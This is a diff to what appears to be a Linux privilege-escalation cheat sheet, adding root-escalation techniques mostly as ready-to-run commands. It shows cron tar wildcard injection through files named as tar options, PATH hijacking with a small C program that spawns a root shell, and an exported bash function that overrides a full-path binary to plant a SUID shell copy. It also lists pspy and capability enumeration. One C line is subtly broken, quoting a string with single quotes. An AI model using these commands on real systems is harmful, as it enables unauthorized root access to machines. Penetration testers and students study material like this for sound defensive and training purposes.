@@ -405,11 +405,45 @@ cat .bash_history
 
 #### CronJobs
 
+Check your cronjobs
 ```
 cat /etc/crontab
 ```
 
+Check if you can overwrite the script that is running via cronjob.
+
+##### Wildcards (normal with tar)
+
+We can do injection with that
+Now check your $PATH and the let's create some malicious file:
+
+```shell
+echo "cp /bin/bash /tmp/bashroot; chmod +s /tmp/bashroot" > runme.sh
+```
+
+Change its permission to execution:
+```
+chmod +x runme.sh
+```
+
+Now, tar specific commands:
+
+```
+touch /full/path/to/--checkpoint=1
+```
+
+```
+touch /full/path/to/--checkpoint-action=exec=sh\runme.sh
+```
+
+Explanation:
+The first command means that you display progress messages every 1 record.
+And then, when you reach this checkpoint, run this command.
+
 ##### Check for some cronjobs out of crontab
+
+[pspy](https://github.com/DominicBreuker/pspy)
+Just run it!
 ```
 ./pspy64
 ```
@@ -513,19 +547,52 @@ Run that suid file and then go to /tmp and access with:
 ./bashroot -p
 ```
 
-##### Binary Symlinks nginx
-
-Discovery it manually is kind of hard
-
-Needs sudo in suid binaries
-
-
 ##### Environment Variables
+
+###### No full path service
 
 Let's exploit $PATH!
 Check if the program uses a binary that is not been executed via full path.
 Then, let's change the PATH
 
+```
+export PATH=/tmp:$PATH
+```
+Check your PATH env!
+
+Let's create a malicious file:
+```shell
+echo "int main(){ setgid(0); setuid(0); system('/bin/bash'); return 0;}" > /tmp/service.c
+```
+
+Let's compile it:
+```
+gcc /tmp/service.c -o /tmp/service
+```
+
+Now, let's run our binary and the we get root!
+
+###### Malicious function (when we have a service has a full path)
+
+Other way is creating a malicious function (for example /usr/sbin/service):
+
+```shell
+function /usr/sbin/service() {cp /bin/bash /tmp/bashroot && chmod +s /tmp/bashroot && /tmp/bashroot -p;}
+```
+
+Now let's export it:
+```
+export -f /usr/sbin/service
+```
+
+Now, call your suid binary and you get a root!
+
+#### Capabilities
+
+Check for capabilities:
+```
+getcap -r / 2>/dev/null
+```
 
 #### Kernel Exploits
 
